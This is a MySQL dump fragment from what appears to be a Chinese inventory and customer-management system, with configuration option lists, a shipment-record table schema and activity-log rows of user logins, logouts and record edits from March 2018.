INSERT INTO `xy_config` VALUES ('42', '基础', 'BASE_ZU', '3', '参数组别', '', '', '2015-04-19 11:02:43', '0000-00-00 00:00:00', '1', '少儿A组：3-6岁\n少儿B组：7-9岁\n少年A组：10-12岁\n少年B组：13-18岁\n青年组：19-40岁\n中老年组：40岁以上', '0');
INSERT INTO `xy_config` VALUES ('43', '基础', 'BASE_XM', '3', '参数项目', '', '', '2015-04-19 11:17:43', '0000-00-00 00:00:00', '1', '大众才艺类\n书画美术类\n全民阅读', '0');
INSERT INTO `xy_config` VALUES ('52', '基础', 'CUST_LAIYUAN', '3', '客户来源', '', '', '2015-05-20 10:04:59', '0000-00-00 00:00:00', '1', '百度推广\n电话营销\n主动联系\n客户介绍', '0');
INSERT INTO `xy_config` VALUES ('53', '基础', 'CUSTGD_TYPE', '3', '跟单方式', '', '', '2015-05-20 10:52:25', '0000-00-00 00:00:00', '1', '电话沟通\nQQ/旺旺\n电子邮箱\n上门拜访', '0');
INSERT INTO `xy_config` VALUES ('54', '基础', 'CUSTGD_JINZHAN', '3', '跟单进展阶段', '', '', '2015-05-20 10:56:47', '2015-07-07 10:43:24', '1', '需求整理\n选择比较\n成交客户\n他人签单', '0');
INSERT INTO `xy_config` VALUES ('55', '基础', 'CUST_XUQIU', '3', '客户需求', '', '', '2015-05-20 11:34:07', '0000-00-00 00:00:00', '1', '软件定制\nCRM/OA\n物流管理\n美容院管理', '0');
INSERT INTO `xy_config` VALUES ('56', '基础', 'CHANPIN_FENLEI', '3', '产品分类', '', '', '2015-05-22 10:23:50', '2015-06-02 09:26:43', '1', '软件服务\n软件配套\n办公用品\n', '0');
INSERT INTO `xy_config` VALUES ('57', '基础', 'CHANPIN_DANWEI', '3', '产品单位', '', '', '2015-05-22 10:26:04', '2015-06-02 09:28:59', '1', '只\n个\n台\n卷\n套', '0');
INSERT INTO `xy_config` VALUES ('58', '基础', 'SHENHE', '3', '审核状态', '', '', '2015-05-22 16:02:16', '2015-07-08 15:56:18', '1', '审核通过\n退回修改', '0');
INSERT INTO `xy_config` VALUES ('59', '基础', 'QUXIANG_TYPE', '3', '去向', '', '', '2015-05-24 23:16:49', '2015-07-19 18:28:27', '1', '外出\n请假', '0');
INSERT INTO `xy_config` VALUES ('60', '基础', 'HUIBAO_TYPE', '3', '汇报类型', '', '', '2015-05-25 09:15:40', '0000-00-00 00:00:00', '1', '日总结\n周总结\n月总结\n年总结\n其他', '0');
INSERT INTO `xy_config` VALUES ('61', '基础', 'ZHISHI_TYPE', '3', '知识分类', '', '', '2015-05-25 10:39:14', '0000-00-00 00:00:00', '1', '产品知识\n技术知识\n营销知识\n质量知识\n培训资料\n管理知识\n其他知识', '0');
INSERT INTO `xy_config` VALUES ('62', '基础', 'TXL_LEIXING', '3', '通讯录类型', '', '', '2015-05-25 12:24:21', '2015-07-19 18:48:16', '1', '私有\n公有', '0');
INSERT INTO `xy_config` VALUES ('63', '基础', 'RENWU_JIEGUO', '3', '处理结果', '', '', '2015-05-31 16:53:05', '0000-00-00 00:00:00', '1', '进行中\n已完成', '0');
INSERT INTO `xy_config` VALUES ('64', '基础', 'BIANHAO_AUTO', '1', '自动编号', '', '编号规则是否自动编号，如果是手工输入的，请删除自动编号', '2015-06-06 08:21:46', '2015-06-06 08:36:11', '1', '自动编号', '0');
INSERT INTO `xy_config` VALUES ('65', '基础', 'BIANHAO_GUIZE', '0', '编号规则', '', '0，年月日秒+4位顺序号\n1，年月日时分秒+2位随机数\n2，年与日+4位随机数', '2015-06-06 08:29:27', '2015-06-06 08:49:54', '1', '0', '0');
INSERT INTO `xy_config` VALUES ('66', '基础', 'BIANHAO_NUM', '0', '编号长度', '', '默认是4位长度值，效果如：0001', '2015-06-06 08:32:59', '0000-00-00 00:00:00', '1', '4', '0');

-- ----------------------------
-- Table structure for `xy_fahuo`
-- ----------------------------
DROP TABLE IF EXISTS `xy_fahuo`;
CREATE TABLE `xy_fahuo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `shijian` date NOT NULL,
  `value` varchar(200) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='发货记录';

-- ----------------------------
-- Records of xy_fahuo
-- ----------------------------

-- ----------------------------
-- Table structure for `xy_log`
-- ----------------------------
DROP TABLE IF EXISTS `xy_log`;
CREATE TABLE `xy_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addtime` datetime NOT NULL,
  `username` char(20) NOT NULL,
  `content` char(100) NOT NULL,
  `os` varchar(100) NOT NULL,
  `url` char(100) NOT NULL,
  `ip` char(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=116 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_log
-- ----------------------------
INSERT INTO `xy_log` VALUES ('31', '2018-03-09 19:21:36', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('30', '2018-03-09 15:11:02', 'admin', '新增成功5', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Quxiang/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('29', '2018-03-09 12:01:58', 'admin', '清理180天以前的日志记录成功!!!', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Log/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('28', '2018-03-09 10:39:21', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('27', '2018-03-09 10:03:00', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('26', '2018-03-09 09:45:03', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('25', '2018-03-09 09:43:55', 'admin', '审核结果审核通过', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Ruku/shenhe.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('24', '2018-03-09 09:18:02', 'admin', '清理180天以前的日志记录成功!!!', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Log/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('23', '2018-03-09 09:17:59', 'admin', '清理180天以前的日志记录成功!!!', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Log/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('14', '2018-03-08 18:40:56', 'admin', '锁定198', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('15', '2018-03-08 18:41:01', 'admin', '启用198', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('16', '2018-03-08 20:46:06', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('17', '2018-03-08 22:11:45', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('18', '2018-03-08 22:23:49', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('19', '2018-03-08 22:23:55', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('20', '2018-03-08 23:16:18', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('21', '2018-03-09 09:12:47', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('22', '2018-03-09 09:13:01', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('32', '2018-03-09 22:31:40', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('33', '2018-03-09 23:02:53', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('34', '2018-03-10 10:57:58', 'admin', '审核结果', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Ruku/shenhe.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('35', '2018-03-10 10:58:03', 'admin', '审核结果审核通过', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Ruku/shenhe.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('36', '2018-03-10 15:05:22', 'admin', '新增成功11', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Chanpin/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('37', '2018-03-11 10:41:46', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('38', '2018-03-11 10:44:22', 'admin', '新增成功6', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Quxiang/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('39', '2018-03-11 10:46:32', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Quxiang/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('40', '2018-03-12 08:58:48', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('41', '2018-03-12 09:01:57', 'admin', '新增成功2', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Renwu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('42', '2018-03-12 09:04:34', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('43', '2018-03-12 09:09:58', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('44', '2018-03-12 09:12:25', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('45', '2018-03-12 09:12:44', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('46', '2018-03-12 09:16:57', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('47', '2018-03-12 09:20:41', '', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('48', '2018-03-12 09:20:47', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('49', '2018-03-12 09:20:56', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('50', '2018-03-12 09:21:00', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('51', '2018-03-12 09:21:03', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('52', '2018-03-12 10:00:20', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('53', '2018-03-12 10:00:31', 'admin', '旧密码不符或者用户名错误！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changePwd.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('54', '2018-03-12 10:00:46', 'admin', '旧密码不符或者用户名错误！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changePwd.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('55', '2018-03-12 10:00:52', 'admin', '密码修改成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changePwd.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('56', '2018-03-12 10:03:47', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('57', '2018-03-12 10:25:47', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('58', '2018-03-12 10:26:25', 'admin', '旧密码不符或者用户名错误！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changePwd.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('59', '2018-03-12 10:26:30', 'admin', '密码修改成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changePwd.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('60', '2018-03-12 10:27:06', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('61', '2018-03-12 10:27:09', 'staff', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('62', '2018-03-12 10:28:17', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('63', '2018-03-12 17:41:39', 'admin', '新增成功20', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('64', '2018-03-12 23:04:28', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('65', '2018-03-12 23:04:33', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('66', '2018-03-12 23:04:39', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('67', '2018-03-12 23:04:55', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('68', '2018-03-13 08:51:06', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('69', '2018-03-13 08:52:39', 'admin', '新增成功87', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Ruku/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('70', '2018-03-13 08:53:46', 'admin', '新增成功9', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Chuku/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('71', '2018-03-13 08:54:08', 'admin', '审核结果退回修改', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Chuku/shenhe.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('72', '2018-03-13 08:54:24', 'admin', '审核结果审核通过', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Chuku/shenhe.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('73', '2018-03-13 09:09:40', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('74', '2018-03-13 09:09:53', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('75', '2018-03-13 09:09:59', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('76', '2018-03-13 09:10:02', 'staff', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('77', '2018-03-13 09:10:14', 'staff', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('78', '2018-03-13 09:10:16', 'staff', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('79', '2018-03-13 09:10:18', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('80', '2018-03-13 09:10:23', 'admin', '保存成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Index/index.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('81', '2018-03-13 09:10:28', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('82', '2018-03-13 09:10:29', 'staff', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('83', '2018-03-13 09:10:43', 'staff', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('84', '2018-03-13 09:10:45', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('85', '2018-03-13 09:22:44', 'admin', '新增成功21', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('86', '2018-03-13 09:22:47', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('87', '2018-03-13 09:22:55', 'cangku', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('88', '2018-03-13 09:23:04', 'cangku', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('89', '2018-03-13 09:25:17', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('90', '2018-03-13 09:25:50', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('91', '2018-03-13 09:26:17', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('92', '2018-03-13 09:26:24', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('93', '2018-03-13 09:26:33', 'cangku', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
